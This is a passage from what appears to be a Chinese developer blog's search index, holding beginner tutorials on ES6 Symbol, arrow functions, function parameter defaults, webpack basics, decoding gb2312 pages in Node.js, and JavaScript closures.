通过上面的代码我们可以控制值的唯一性，防止覆盖串改;\n同样我们可以把Symbol类型作为属性名，这样可以用来防止当别人拿到我们的对象时候新增或者修改、覆盖到对象重要的属性。如果使用Symbol类型当作属性名或者作为方法名调用的时候，必须把Symbol类型的值放在方括号中，比如下面的例子：\nvar printHello = Symbol(\u0026#39;this is print \u0026#34;hello\u0026#34; function name\u0026#39;); var obj = { [printHello]() { console.log(\u0026#39;hello\u0026#39;); } } obj.printHello(); // undefined obj[printHello](); // hello Symbol类型作为属性名的遍历 Symbol作为属性名的时候，不会出现在for...in、for...of循环中，同样也不会被Object.keys、Ojbect.getOwnPropertyNames()返回。但是他不是一个私有属性，有两个方法可以返回对象中含有Symbol类型的属性，分别是Object.getOwnPropertySymbols()和Reflect.ownKeys()\nObject.getOwnPropertySymbols Object.getOwnPropertySymbols返回一个数组，返回当前对象所有用Symbol类型值当作属性名的属性。\nvar a = Symbol(\u0026#39;a\u0026#39;); var b = Symbol(\u0026#39;b\u0026#39;); var obj = { [a]: \u0026#39;a\u0026#39;, [b]: \u0026#39;b\u0026#39;, c : \u0026#39;c\u0026#39; } Object.getOwnPropertySymbols(obj); // [Symbol(a), Symbol(b)] Reflect.ownKeys Reflect.ownKeys返回一个数组，返回当前对象所有的的属性，包括Symbol类型、可枚举和不可枚举的属性。\nvar a = Symbol(\u0026#39;a\u0026#39;); var b = Symbol(\u0026#39;b\u0026#39;); var obj = { [a]: \u0026#39;a\u0026#39;, [b]: \u0026#39;b\u0026#39;, c : \u0026#39;c\u0026#39; } Reflect.ownKeys(obj); // [\u0026#34;c\u0026#34;, Symbol(a), Symbol(b)] 可重复使用Symbol值 ES6为可重复使用的Symbol值定义了两个方法Symbol.for和Symbol.keyFor。\nSymbol.for Symbol.for方法同样有一个参数，这个参数是当前实例的Symbol类型数据的描述，Symbol.for()方法同样放回一个Symbol类型值，但是返回之前会先查找全局中是否存在同样的Symbol值，如果存在则返回这个存在的Symbol值，如果不存在则新创建一个Symbol值并返回。它和Symbol()不同的区别在于Symbol.for()返回的是一个登记的全局Symbol数据类型，而Symbol返回的一个唯一的Symbol类型值。\nvar a = Symbol.for(\u0026#39;123\u0026#39;); // 第一次没有查找到全局中有登记为\u0026#39;123\u0026#39;的Symbol值 var b = Symbol.for(\u0026#39;123\u0026#39;); // 第二次查找到全局中有登记为\u0026#39;123\u0026#39;的Symbol值，所以返回的值和变量a一样 a === b; // true var a = Symbol(\u0026#39;123\u0026#39;); var b = Symbol(\u0026#39;123\u0026#39;); a === b; // false 两次返回的Symbol值都为唯一值，所以不相等 Symbol.keyFor Symbol.keyFor返回Symbol类型登记的值，只返回登记的Symbol类型值，Symbol()生成的值不能使用。\nvar k = Symbol.for(\u0026#39;this is k\u0026#39;); Symbol.keyFor(k); // \u0026#39;this is k\u0026#39; 文完\n","permalink":"/posts/ecmascript-symbol/","summary":"参考：《ES6标准入门教程》 作者：阮一峰\nSymbol原始类型 Javascript一共有6种原始数据类型，分别为：\nundefined null Boolean Object String Array ES6新增加了一种原始数据类型，也就是说从ES6开始，Javascript一共有7种原始数据类型，全新的数据类型是Symbol类型，Symbol用来声明一个独一无二的值。因为Symbol类型返回的是一个原始类型值，不是返回的对象，也不能添加属性，所以在Symbol函数前不能使用new命令。\nSymbol的参数是一个字符串，用于描述Symbol实例，如果为空则返回一个\u0026quot;Symbol()\u0026quot;，并且每一个Symbol类型的值都是唯一的并且不相等的，比如：\nvar a = Symbol(\u0026#39;1\u0026#39;); var b = Symbol(\u0026#39;1\u0026#39;); a === b; // false 当我们使用typeof运算符来判断是什么类型的时候，返回的结果是如下：\nvar s = Symbol(\u0026#39;this is s\u0026#39;); typeof s; // symbol 那Symbol到底有什么作用？很多时候我们要保证值的唯一性，防止被串改或者覆盖，比如我们使用switch判断的时候，通常我们会这样来建立一个对象来消除魔术字符串然后用对象的属性值来作判断，比如：\nvar persons = { a: \u0026#39;123\u0026#39; } function ifPerson(person) { switch(person) { case persons.a: console.log(\u0026#39;a\u0026#39;); break; } } ifPerson(persons.a); // a 同样也可以通过传递字符串来达到判断的效果，或者我们重新定义一个值等于123的变量来达到判断的效果：\nvar persons = { a: \u0026#39;123\u0026#39; } function ifPerson(person) { switch(person) { case persons.","title":"es6新数据类型-Symbol"},{"content":"参考：《ES6标准入门教程》 作者：阮一峰\n在ES6中允许了一种新函数方式“箭头函数”，它大概的如下：\nvar a = (x) =\u0026gt; x; 等同 var a = function(x){ return x; } 如果不需要参数，使用一个空括号代表就可以了\nvar a = () =\u0026gt; 1; 等同 var a = function() { return 1; } 如果箭头函数需要在返回之前进行一些逻辑操作，那么需要添加大括号{}，并显示的声明return语句，如果没有return语句那么返回的是一个undefined:\nvar a = (x) =\u0026gt; { x += x; return x; } 等同 var a = function(x) { x += x; return x; } 由于在Javascript中把大括号{}认为是一个代码块，所以如果我们需要返回的是一个对象，那么我们需要用()包围{}：\nvar a = () =\u0026gt; ({a: 1, b:2}); a(); // {a: 1, b:2} 在回调函数的时候使用箭头函数可以很大的增加我们代码的阅读能力以及代码的简洁：\n[1, 2, 3].map(function(x) { return x + 1; }); 使用箭头函数 [1, 2, 3].map((x) =\u0026gt; x + 1); 但是在使用箭头函数之前你可能需要注意以下几点：\n箭头函数内部的this指针是指向定义时所在的对象，而不是使用时的所在的对象。和普通的函数不一样，箭头函数内部的this指针是固定的。 箭头函数不可当作构造函数来使用，也就是说不能使用new命令，因为箭头函数内部没有this对象，所以在定义的时候箭头函数的this对象其实指的在定义时作用域内的this对象。 箭头函数内部没有argunments对象，如果需要可以使用(\u0026hellip;ary)这样的方式来获取多个参数。 上面第一点一定注意，这可能会影响你代码的未知错误。如果是普通的函数，当经过100毫秒后，普通函数this指针指向所运行时的作用域，也就是全局对象。可以通过下面的代码来说明：\nfunction conlog(){ setTimeout(() =\u0026gt; { console.log(\u0026#39;箭头函数:\u0026#39;, this.id) }, 100); setTimeout(function(){ console.log(\u0026#39;普通函数:\u0026#39;, this.id); }, 100); } var id = 10; conlog.call({id: 9}); // 箭头函数: 9 // 普通函数：10 文完\n","permalink":"/posts/es6-arrow-function/","summary":"参考：《ES6标准入门教程》 作者：阮一峰\n在ES6中允许了一种新函数方式“箭头函数”，它大概的如下：\nvar a = (x) =\u0026gt; x; 等同 var a = function(x){ return x; } 如果不需要参数，使用一个空括号代表就可以了\nvar a = () =\u0026gt; 1; 等同 var a = function() { return 1; } 如果箭头函数需要在返回之前进行一些逻辑操作，那么需要添加大括号{}，并显示的声明return语句，如果没有return语句那么返回的是一个undefined:\nvar a = (x) =\u0026gt; { x += x; return x; } 等同 var a = function(x) { x += x; return x; } 由于在Javascript中把大括号{}认为是一个代码块，所以如果我们需要返回的是一个对象，那么我们需要用()包围{}：\nvar a = () =\u0026gt; ({a: 1, b:2}); a(); // {a: 1, b:2} 在回调函数的时候使用箭头函数可以很大的增加我们代码的阅读能力以及代码的简洁：","title":"ES6箭头函数"},{"content":"参考：《ES6标准入门教程》 作者：阮一峰\n一、函数的默认值设置 在ES5的时候如果一个函数的参数必须为有效值，那么我们通常会这样做一个判断：\nfunction conlog(a) { if (!a) { a = 1; } console.log(a); //1 } 或者\nfunction conlog(a) { a = a || \u0026#39;1\u0026#39;; console.log(a); //1 } 在ES6中允许为函数的参数设置默认值，这个默认值只有在没有传入的时候有效，在传入参数后这个默认值失效，通过默认值设置可以很大的提高代码的容错能力，写法如下：\nfunction conlog(a = 1) { console.log(a); } conlog(); //1 conlog(2); //2 如果你只指定了第一个参数的默认值，那么当这个参数是无法省掉的，你必须通过显示的传入undefined才能使默认值生效，所以在使用过程中建议把必需传入的参数放在前面，带有默认值的参数放在尾部，比如下面：\nfunction conlog(a = 1, b) { console.log(a, b); } conlog(); // 1 undefined conlog(2); // 2 undefined conlog(, 1); //报错 conlog(undefined, 2); // 1 2 二、解构默认值 ES6允许函数的参数为解构模式来设置默认值，但按照我们通常的理解方式数组解构应该是下面的写法。\nfunction conlog([a = 1, b = 2]) { console.log(a, b); } conlog(); //报错 conlog([]); // 1 2 上面的写法不能达到我们解构模式来设置默认值的要求，因为在解构模式下，需要有对等的结构来进行解构，在这里需要注意的一点是数组解构是需要分传参的位置,如果我们需要通过解构来设置默认值需要如下面这样来写：\nfunction conlog([a = 1, b = 2] = []) { console.log(a, b); } conlog(); // 1 2 conlog([3, 4]); // 3 4 或者通过下面的写法都可以实现设置默认值:\nfunction conlog([a, b] = [1 ,2]) { console.log(a, b); } conlog(); // 1 2 conlog([3, 4]); // 3 4 ES6对象解构同样允许使用，如果需要设置对象默认值解构，同理需要像数组解构设置一个空的对象值，比如下面这样来写：\nfunction conlog({a = 1, b = 2} = {}) { console.log(a, b); } conlog(); // 1 2 conlog({a: 3, b: 4}); // 3 4 或者：\nfunction conlog({a, b} = {a: 1, b: 2}) { console.log(a, b); } conlog(); // 1 2 conlog({a: 3, b: 4}); // 3 4 在对象解构中，不要求顺序，只需要你在传入的对象中含有这两个属性名即可，如果没有找到对应的属性名那么将会使用默认值，如果没有默认值将会是undefined。\nfunction conlog({a = 1, b = 2} = {}) { console.log(a, b); } conlog({b: 4, a: 3}); // 3 4 但是这里注意，上面的数组解构以及对象解构传入后都成为了函数内部的变量，不是一个有效的数组以及对象，如果你需要得到传入的参数是数组或者对象，那么可以通过扩展运算符\u0026rsquo;\u0026hellip;\u0026lsquo;来实现：\nfunction conlog([...ary] = [1, 2]) { console.log(ary.toString()); } conlog(); // 1,2 conlog([3, 4]); // 3,4 对象的写法如下：\nfunction conlog({obj} = {obj: {a: 5}}) { console.log(obj.a); } conlog(); // 5 conlog({obj: {a: 1}}); // 1 当然ES7已有提案将rest运用在对象中，目前大多数不支持，但是babel已经支持了。\nfunction conlog({...obj} = {a: 5}) { console.log(obj.a); } conlog(); // 5 conlog({a: 8}); // 8 函数的length属性 函数的length属性返回的数值是指函数预期需要传入的参数数量。但是一旦我们给某个参数指定了默认值后，此参数就不在计此参数，所以函数的lenght等于函数需要预期传入的参数数量减去设置了默认值的参数数量\nfunction conlog(x = 1, b = 2) { console.log(x, b); } conlog.length // 0 function conlog(x, b) { console.log(x, b); } conlog.length // 2 函数的作用域 由于es6定于了块作用域以及let 和 const两个变量声明方法，所以es6函数作用域也会有一些变动。比如下面的例子，作为参数x在函数内部重复声明了一次，ES6声明在块作用域中参数和let及const声明的变量都会提升到块作用域顶部，并且此变量在没有声明之前不能使用以及调用，这个被称为\u0026quot;暂时性死区\u0026quot;。\nfunction conlog(x = 5) { let x = 3; console.log(x); } conlog(); //报错 暂时性死区不影响var声明的变量，但var会覆盖局部变量，所以慎用var，尽量用let、const来代替var。\nfunction conlog(x = 5) { console.log(x); // 5 var x = 3; console.log(x); // 3 } conlog(); 除此之外es6增加的块作用域可以替代让新人纠结已久的匿名函数了\n(function(){ var a = 3; }) 可以用块作用域代替\n{ let a = 3; } 文完\n","permalink":"/posts/ecmascript-func/","summary":"参考：《ES6标准入门教程》 作者：阮一峰\n一、函数的默认值设置 在ES5的时候如果一个函数的参数必须为有效值，那么我们通常会这样做一个判断：\nfunction conlog(a) { if (!a) { a = 1; } console.log(a); //1 } 或者\nfunction conlog(a) { a = a || \u0026#39;1\u0026#39;; console.log(a); //1 } 在ES6中允许为函数的参数设置默认值，这个默认值只有在没有传入的时候有效，在传入参数后这个默认值失效，通过默认值设置可以很大的提高代码的容错能力，写法如下：\nfunction conlog(a = 1) { console.log(a); } conlog(); //1 conlog(2); //2 如果你只指定了第一个参数的默认值，那么当这个参数是无法省掉的，你必须通过显示的传入undefined才能使默认值生效，所以在使用过程中建议把必需传入的参数放在前面，带有默认值的参数放在尾部，比如下面：\nfunction conlog(a = 1, b) { console.log(a, b); } conlog(); // 1 undefined conlog(2); // 2 undefined conlog(, 1); //报错 conlog(undefined, 2); // 1 2 二、解构默认值 ES6允许函数的参数为解构模式来设置默认值，但按照我们通常的理解方式数组解构应该是下面的写法。\nfunction conlog([a = 1, b = 2]) { console.","title":"ES6函数的扩展"},{"content":"1、简介 此教程涉及不深入，并除去了很多复杂的东西，记录也坚持以最简单为主，让初学者大概对webpack有一个简单的系统认识，更好的去进一步深入学习webpack。\nWebpack是一个Javscript的打包程序，webpack会自动分析每个模块之间的依赖，然后将这些依赖统一打包成一个或多个文件。\nwebpack最强悍的地方是可以通过官方、第三方的插件以及加载器(loader)来实现对各种文件的解析、编译。\nWebpack最重要的四个核心概念：入口(entry)、输出(output)、加载器(loader)、插件(plugin)，下面我以做笔记的方式尽量说明几个概念的意思，如果想深入或者笔记中有不太明白的地方，可以到官方网站的文档中去查看。\n2、入口(entry) webpack的入口就相当于一个网页的index文件，有了入口文件，这样webpack才知道从何下手，webpack会根据这个入口文件去分析入口文件所依赖的所有文件，然后将这些所有的依赖文件打包成一个或者多个文件。\nwebpack提供了单个入口语法、对象语法。单个入口语法也是最简单的一种，只有一个入口文件，即一个进一个出。比如下面的这一种。\n1 { 2 entry: \u0026#39;./index.js\u0026#39; 3 } 对象语法主要是针对多个页面的应用程序，告诉webpack有三个入口文件，当打包完成的时候也是三个文件，这三个文件相互独立，每个文件只包含自己所依赖的文件。比如下面这样：\n{ entry: { hello1: \u0026#39;./hello1.js\u0026#39;, hello2: \u0026#39;./hello2.js\u0026#39; } } 3、输出(output) webpack提供了output属性，来控制webpack如何把编译好的文件写入到硬盘中，输入和输出是对应的，有输入就有输出。但是必须注意一点，可以存在多个输入，但是只能存在一个输出，那怎么来输出多个独立的编译好的文件呢？webpack中当然有应对的机制。\nwebpack要求output属性为对象，并且必须包含两个属性：filename、path。顾名思义filename即输出文件的文件名，而path则为输出文件的绝对路径(注意,path必须为决定路径)。\n单个入口output属性写法：\n{ entry: \u0026#39;./index.js\u0026#39;, output: { path: path.resolve(__dirname, \u0026#39;app\u0026#39;), //path为nodejs自身的库。__dirname为nodejs在运行过程中的一个环境变量，里面是当前文件夹的完整目录名。resolve方法是把相对路径的app目录解析为一个决定路径。 filename: \u0026#39;bundle.js\u0026#39; } } webpack内置了多个变量来应对多个入口文件，如[name]、[hash]、[id]、[chunkhash]，通过变量来保证每个文件的唯一性来达到生成多个文件，在生成过程中webpack会把这几个变量替换为相应的字符串用于保证文件的唯一性。\n多个入口output属性写法：\n{ entry: \u0026#39;./index.js\u0026#39;, output: { path: path.resolve(__dirname, \u0026#39;app\u0026#39;), filename: [name]-[hash]-bundle.js } } 4、加载器(loader) loader可以对不同类型的文件进行编译转换，比如jsx、typescript直接拿在浏览器上运行是不能运行的，那么我们在编写程序的时候需要借助jsx以及typescript等高效的库来提高我们编写程序的效率，但是我们又需要能正常使用，如果每种文件类型我们都通过一种转换工具，那么就显的很麻烦，所以laoder就是来处理这样的工作。\n首先在使用loader的时候我们需要安装相应的插件，比如es2015，那我们安装babel-loader，如果是css，那我们安装css-loader，通过下面的module属性里面的rules数组来对需要转换的文件设置loader。\n{ entry: \u0026#39;./index.js\u0026#39;, output: { path: path.resolve(__dirname, \u0026#39;app\u0026#39;), filename: [name]-[hash]-bundle.js }, module: { rules : [ {test: /.js$/, use: \u0026#39;babel-loader\u0026#39;} ] } } 上面的rules是一个数组，每个元素是一个对象，对象里面包含了两个属性test、use，test的值是一个正则表达式，它的作用是将当前loader用于什么文件，这里正则表达式就是用来匹配你需要转换的文件类型，use是当前匹配到的文件用什么加载器来转换、编译。\n有三种方式来使用loader加载器\nwebpack配置文件 require语句中使用 通过命令行使用 第一种上面我们已经说了，下面简单的介绍一下第二种和第三种，第二种使用方法是我们在require或者import文件的时候可以直接使用，比如下面的代码：\nrequire(\u0026#39;babel-loader!./hello.js\u0026#39;) 或者 Import(\u0026#39;babel-loader!./hello.js\u0026#39;) 第三种方式是直接通过webpack提供的命令行工具—module-bind使用，比如下面的代码：\nwebpack —module-bind \u0026#39;js=babel-loader\u0026#39; 5、插件(plugin) 插件用于解决loader无法解决的事情，比如给每个js文件进行添加著作标记、压缩文件等功能，每个插件都可能有参数选项，每个插件在使用的时候也必须使用new操作符来建立一个插件的实例。插件通过plugins属性来设置，plugins是一个数组，每个元素代表一个插件的实例。因为插件有官方的还有第三方的，所以不会一一去说怎么使用，只是给大家简单演示一下，大家需要用到哪个插件再去查这个插件的api。\nconst HtmlWebpackPlugin = require(\u0026#39;html-webpack-plugin\u0026#39;); //首先要使用插件，必须先引入插件 { entry: \u0026#39;./index.js\u0026#39;, output: { path: path.resolve(__dirname, \u0026#39;app\u0026#39;), filename: [name]-[hash]-bundle.js }, module: { rules : [ {test: /.js$/, use: \u0026#39;babel-loader\u0026#39;} ] }, plugins: [ new HtmlWebpackPlugin({telmplate : \u0026#39;./index.html\u0026#39;}) //通过plugins来使用你需要使用插件。 ] } 6、总结 通过上面的学习，你可以了解到webpack的四个核心，入口、输出、加载器、插件，入口就是你要编译的是哪个文件，指定了过后webpack会自行寻找依赖的文件打包编译。输出就是编译转换好了过后把文件写入到硬盘的哪里。加载器就是对不同类型的文件转换，从而让浏览器能直接运行。插件做的是loader无法解决的事情。\n其实webpack的配置并没有想象中的那么复杂，webpack的配置文件就是一个js文件，只要对webpack有一个系统的认识后，你就知道我该从哪里下手，该从哪里入手了。\n","permalink":"/posts/webpack/","summary":"1、简介 此教程涉及不深入，并除去了很多复杂的东西，记录也坚持以最简单为主，让初学者大概对webpack有一个简单的系统认识，更好的去进一步深入学习webpack。\nWebpack是一个Javscript的打包程序，webpack会自动分析每个模块之间的依赖，然后将这些依赖统一打包成一个或多个文件。\nwebpack最强悍的地方是可以通过官方、第三方的插件以及加载器(loader)来实现对各种文件的解析、编译。\nWebpack最重要的四个核心概念：入口(entry)、输出(output)、加载器(loader)、插件(plugin)，下面我以做笔记的方式尽量说明几个概念的意思，如果想深入或者笔记中有不太明白的地方，可以到官方网站的文档中去查看。\n2、入口(entry) webpack的入口就相当于一个网页的index文件，有了入口文件，这样webpack才知道从何下手，webpack会根据这个入口文件去分析入口文件所依赖的所有文件，然后将这些所有的依赖文件打包成一个或者多个文件。\nwebpack提供了单个入口语法、对象语法。单个入口语法也是最简单的一种，只有一个入口文件，即一个进一个出。比如下面的这一种。\n1 { 2 entry: \u0026#39;./index.js\u0026#39; 3 } 对象语法主要是针对多个页面的应用程序，告诉webpack有三个入口文件，当打包完成的时候也是三个文件，这三个文件相互独立，每个文件只包含自己所依赖的文件。比如下面这样：\n{ entry: { hello1: \u0026#39;./hello1.js\u0026#39;, hello2: \u0026#39;./hello2.js\u0026#39; } } 3、输出(output) webpack提供了output属性，来控制webpack如何把编译好的文件写入到硬盘中，输入和输出是对应的，有输入就有输出。但是必须注意一点，可以存在多个输入，但是只能存在一个输出，那怎么来输出多个独立的编译好的文件呢？webpack中当然有应对的机制。\nwebpack要求output属性为对象，并且必须包含两个属性：filename、path。顾名思义filename即输出文件的文件名，而path则为输出文件的绝对路径(注意,path必须为决定路径)。\n单个入口output属性写法：\n{ entry: \u0026#39;./index.js\u0026#39;, output: { path: path.resolve(__dirname, \u0026#39;app\u0026#39;), //path为nodejs自身的库。__dirname为nodejs在运行过程中的一个环境变量，里面是当前文件夹的完整目录名。resolve方法是把相对路径的app目录解析为一个决定路径。 filename: \u0026#39;bundle.js\u0026#39; } } webpack内置了多个变量来应对多个入口文件，如[name]、[hash]、[id]、[chunkhash]，通过变量来保证每个文件的唯一性来达到生成多个文件，在生成过程中webpack会把这几个变量替换为相应的字符串用于保证文件的唯一性。\n多个入口output属性写法：\n{ entry: \u0026#39;./index.js\u0026#39;, output: { path: path.resolve(__dirname, \u0026#39;app\u0026#39;), filename: [name]-[hash]-bundle.js } } 4、加载器(loader) loader可以对不同类型的文件进行编译转换，比如jsx、typescript直接拿在浏览器上运行是不能运行的，那么我们在编写程序的时候需要借助jsx以及typescript等高效的库来提高我们编写程序的效率，但是我们又需要能正常使用，如果每种文件类型我们都通过一种转换工具，那么就显的很麻烦，所以laoder就是来处理这样的工作。\n首先在使用loader的时候我们需要安装相应的插件，比如es2015，那我们安装babel-loader，如果是css，那我们安装css-loader，通过下面的module属性里面的rules数组来对需要转换的文件设置loader。\n{ entry: \u0026#39;./index.js\u0026#39;, output: { path: path.resolve(__dirname, \u0026#39;app\u0026#39;), filename: [name]-[hash]-bundle.js }, module: { rules : [ {test: /.","title":"Webpack快速入门教程"},{"content":"在使用cheerio处理request模块返回的gb2312网页出现了乱码，从开始一直排查问题，一直排查到request、cheerio都有问题。\nvar request = require(\u0026#39;request\u0026#39;); var iconv = require(\u0026#39;iconv-lite\u0026#39;); var cheerio = require(\u0026#39;cheerio\u0026#39;); request({ encoding: null, url: \u0026#39;http://www.qq.com\u0026#39; }, function(error, response, body) { var html = iconv.decode(body, \u0026#39;gb2312\u0026#39;); var $ = cheerio.load(html, { decodeEntities: false} ); .................................... } }); 首先request会进行一次转码，这里需要设置request不转码，然后使用iconv-lite插件把接收的数据解码为gb2312，然后再次使用cheerio解析接收到的数据为dom，并且设置编码，下面为详细的数据。\n","permalink":"/posts/nodejs-gb2312/","summary":"在使用cheerio处理request模块返回的gb2312网页出现了乱码，从开始一直排查问题，一直排查到request、cheerio都有问题。\nvar request = require(\u0026#39;request\u0026#39;); var iconv = require(\u0026#39;iconv-lite\u0026#39;); var cheerio = require(\u0026#39;cheerio\u0026#39;); request({ encoding: null, url: \u0026#39;http://www.qq.com\u0026#39; }, function(error, response, body) { var html = iconv.decode(body, \u0026#39;gb2312\u0026#39;); var $ = cheerio.load(html, { decodeEntities: false} ); .................................... } }); 首先request会进行一次转码，这里需要设置request不转码，然后使用iconv-lite插件把接收的数据解码为gb2312，然后再次使用cheerio解析接收到的数据为dom，并且设置编码，下面为详细的数据。","title":"Nodejs 处理gb2312内容乱码问题"},{"content":"垃圾回收器 我个人把闭包抽象的称之为”阻止垃圾回收器的函数”或者”有权访问另一个函数内部变量的函数\u0026quot;(当然这个是我个人的理解方式，每个人可能会有不同的理解方式)，为什么这样说？这样说还得说说垃圾回收器，一些编程语言如C语言对于内存管理是由程序员说了算，也就是说程序员决定这个变量是否还需要，如果不需要就释放这个变量占用的空间，而这个变量也不复存在了，这样做的好处是可以及时释放内存空间，让那些需要使用内存空间的程序来使用。\n而在Javascript中，我们是不需要这样做的，Javascript有一个叫”垃圾回收器”的系统，它会自动对于那些我们不再使用的变量进行回收。那问题来了，它怎么知道我们不再需要这个变量了？在Javascript里面有两个回收机制一个为：”引用计数”，另外一个为\u0026quot;标记清除\u0026quot;，垃圾回收器会根据代码里面对变量的调用(引用)来判断，如果这个变量的调用(引用)为0那么就表示可以回收了。\n引用计数 引用计数是如何工作？拿一个例子来说吧：\n“有一家公司的小明，他工作是和销售有关的，所以他每天会开公司的车去见客户、接客户进行推销。而取得公车的步骤需要向管车的王大爷进行预约，然后王大爷会把预约纪录到今天的预约表上，使用完后需要把车交给王大爷并把记录划掉。有一天小明需要使用公车，小明打电话给王大爷表明他下午两点会使用公车，王大爷随后把此次预约纪录到了今天的预约表上，到了约定时间，小明取到了公车。随后与客户一番见面商谈过后把公车交还给王大爷，王大爷同时也把预约表上的小明这一条记录给划掉，王大爷随后看了看预约表，今天没有人预约了，看来可以早点下班了，于是把车停回车库下班了。”\n其实上面的例子可以看出来，王大爷相当于”垃圾回收器”，而王大爷依据什么来进行处理回收的？是根据预约表，而这个预约表就相当于”引用计数”,当这个预约表上没有人预约公车的时候，王大爷就把车停回了车库，当然如果还有预约王大爷还得一直等待预约表上没有任何预约了才能把车停回车库并下班。也就相当于当这个变量没有人在需要使用的时候，这个变量就可以被“回收”了。\n标记清除 这一节点很感谢\u0026quot;linkFly\u0026ldquo;前辈指出我的错误，我错误的把\u0026quot;引用计数\u0026quot;理解为最常用的计数了，所以在这里感谢\u0026rdquo;linkFly\u0026ldquo;前辈。\n目前\u0026quot;标记清除\u0026quot;技术是最常用的一种内存回收机制，现在chrome和Safari以及新版本IE、opera等浏览器均采用这样的内存回收机制。\n\u0026ldquo;标记清除\u0026quot;不同于\u0026quot;引用计数\u0026rdquo;，标记清除更加简单，相当于告诉我们这个变量能使用或者不能用。当一个变量声明的时候，变量会被标记为\u0026quot;进入环境\u0026rdquo;,而当变量离开了环境过后就标记为\u0026quot;离开环境\u0026quot;。\n标记清除的工作方式大概为：\n首先javascript会在全局中给所有的变量加上标记，然后去掉在环境中的变量以及环境中被引用的变量的标记，其他被标记的变量表示可以清除的变量，在垃圾回收器执行的时候将会把这些变量清除掉。\n什么是闭包？ 在正常的回收机制下，当我们不再使用这个函数或者变量的时候就会被回收，不再使用是指在当前我们执行的状态之后没有出现在调用(引用)变量的语句了。下面有一个例子，简单的介绍了一下闭包，例子中logHello被赋值一个自执行匿名函数返回的函数，这个函数是有权限访问自执行匿名函数内部的log_num变量的，这样的函数被称为闭包，因为返回的函数内部有一个对自执行匿名函数内部log_num变量的引用。\n1 var logHello; 2 3 4 logHello = ( function () { 5 6 var log\\_num = 20; 7 8 return function() { 9 10 return log\\_num; 11 12 }; 13 14 } )(); 下面还有一个例子，logHello被赋值自执行函数返回的一个对象，这个对象里面包含了两个方法”read”和”write”，这两个方法都属于闭包，他们都有权访问log_name变量。”read”负责读取log_name这个变量的值,而”write”负责重写log_name的值，在外部是没有任何情况直接访问log_name变量的，只能通过这两个方法来进行间接的访问和设置这个变量，这样的方法同样属于闭包。\n1 var logHello; 2 3 logHello = ( function () { 4 5 var log\\_name = \u0026#39;wyz\u0026#39;; 6 7 return { 8 read: function () { 9 return log\\_name; 10 }, 11 12 write: function (newValue) { 13 log\\_name = newValue; 14 } 15 }; 16 17 } )(); 闭包是怎么形成的？ 从上面可以知道判断一个变量是否可以回收，根据这个变量的是否被引用就可以判断，比如下面例中，局部变量log_name被返回的匿名函数引用，那么就不会被垃圾回收器回收，这就是闭包的形成，因为闭包会保持对变量引用，让垃圾回收器不会回收此变量。\n1 var logHello; 2 3 logHello = ( function () { 4 5 6 var log\\_num = 20; 7 8 return function() { 9 10 return log\\_num; \u0026lt;\u0026lt;返回一个匿名函数，函数内部可以对局部变量log\\_num进行访问。 11 12 }; 13 14 15 } )(); 经过上面的一些例子，就很容易理解了，噢～还没有理解？，那你再继续看看后面的总结吧(但相信我，多思考思考，肯定能理解)。\n闭包可以理解为：会保存对变量的引用而不会让变量被垃圾回收器回收。\n","permalink":"/posts/javascript-closure/","summary":"垃圾回收器 我个人把闭包抽象的称之为”阻止垃圾回收器的函数”或者”有权访问另一个函数内部变量的函数\u0026quot;(当然这个是我个人的理解方式，每个人可能会有不同的理解方式)，为什么这样说？这样说还得说说垃圾回收器，一些编程语言如C语言对于内存管理是由程序员说了算，也就是说程序员决定这个变量是否还需要，如果不需要就释放这个变量占用的空间，而这个变量也不复存在了，这样做的好处是可以及时释放内存空间，让那些需要使用内存空间的程序来使用。\n而在Javascript中，我们是不需要这样做的，Javascript有一个叫”垃圾回收器”的系统，它会自动对于那些我们不再使用的变量进行回收。那问题来了，它怎么知道我们不再需要这个变量了？在Javascript里面有两个回收机制一个为：”引用计数”，另外一个为\u0026quot;标记清除\u0026quot;，垃圾回收器会根据代码里面对变量的调用(引用)来判断，如果这个变量的调用(引用)为0那么就表示可以回收了。\n引用计数 引用计数是如何工作？拿一个例子来说吧：\n“有一家公司的小明，他工作是和销售有关的，所以他每天会开公司的车去见客户、接客户进行推销。而取得公车的步骤需要向管车的王大爷进行预约，然后王大爷会把预约纪录到今天的预约表上，使用完后需要把车交给王大爷并把记录划掉。有一天小明需要使用公车，小明打电话给王大爷表明他下午两点会使用公车，王大爷随后把此次预约纪录到了今天的预约表上，到了约定时间，小明取到了公车。随后与客户一番见面商谈过后把公车交还给王大爷，王大爷同时也把预约表上的小明这一条记录给划掉，王大爷随后看了看预约表，今天没有人预约了，看来可以早点下班了，于是把车停回车库下班了。”\n其实上面的例子可以看出来，王大爷相当于”垃圾回收器”，而王大爷依据什么来进行处理回收的？是根据预约表，而这个预约表就相当于”引用计数”,当这个预约表上没有人预约公车的时候，王大爷就把车停回了车库，当然如果还有预约王大爷还得一直等待预约表上没有任何预约了才能把车停回车库并下班。也就相当于当这个变量没有人在需要使用的时候，这个变量就可以被“回收”了。\n标记清除 这一节点很感谢\u0026quot;linkFly\u0026ldquo;前辈指出我的错误，我错误的把\u0026quot;引用计数\u0026quot;理解为最常用的计数了，所以在这里感谢\u0026rdquo;linkFly\u0026ldquo;前辈。\n目前\u0026quot;标记清除\u0026quot;技术是最常用的一种内存回收机制，现在chrome和Safari以及新版本IE、opera等浏览器均采用这样的内存回收机制。\n\u0026ldquo;标记清除\u0026quot;不同于\u0026quot;引用计数\u0026rdquo;，标记清除更加简单，相当于告诉我们这个变量能使用或者不能用。当一个变量声明的时候，变量会被标记为\u0026quot;进入环境\u0026rdquo;,而当变量离开了环境过后就标记为\u0026quot;离开环境\u0026quot;。\n标记清除的工作方式大概为：\n首先javascript会在全局中给所有的变量加上标记，然后去掉在环境中的变量以及环境中被引用的变量的标记，其他被标记的变量表示可以清除的变量，在垃圾回收器执行的时候将会把这些变量清除掉。\n什么是闭包？ 在正常的回收机制下，当我们不再使用这个函数或者变量的时候就会被回收，不再使用是指在当前我们执行的状态之后没有出现在调用(引用)变量的语句了。下面有一个例子，简单的介绍了一下闭包，例子中logHello被赋值一个自执行匿名函数返回的函数，这个函数是有权限访问自执行匿名函数内部的log_num变量的，这样的函数被称为闭包，因为返回的函数内部有一个对自执行匿名函数内部log_num变量的引用。\n1 var logHello; 2 3 4 logHello = ( function () { 5 6 var log\\_num = 20; 7 8 return function() { 9 10 return log\\_num; 11 12 }; 13 14 } )(); 